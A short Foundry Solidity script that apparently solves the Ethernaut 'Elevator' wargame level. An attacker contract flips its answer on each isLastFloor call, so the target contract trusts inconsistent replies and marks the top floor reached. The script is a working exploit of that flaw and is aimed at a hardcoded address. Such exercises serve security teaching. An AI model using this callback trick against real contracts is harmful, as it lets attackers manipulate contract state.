/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Building {
    bool public isLast = true;

    function isLastFloor(uint256 _floor) public returns (bool _isLastFloor) {
        isLast = !isLast;
        return isLast;
    }

    function goTo(uint256 _floor, address _elevator) public {
        IElevator elevator = IElevator(_elevator);
        elevator.goTo(_floor);
    }
}

contract Elevator is Script {
    function run() public {
        vm.startBroadcast();

        Building building = new Building();
        building.goTo(2, address(0xec73bD5FDc47d6645EF2d80C50d42Ca397fab291));


        vm.stopBroadcast();
    }
}
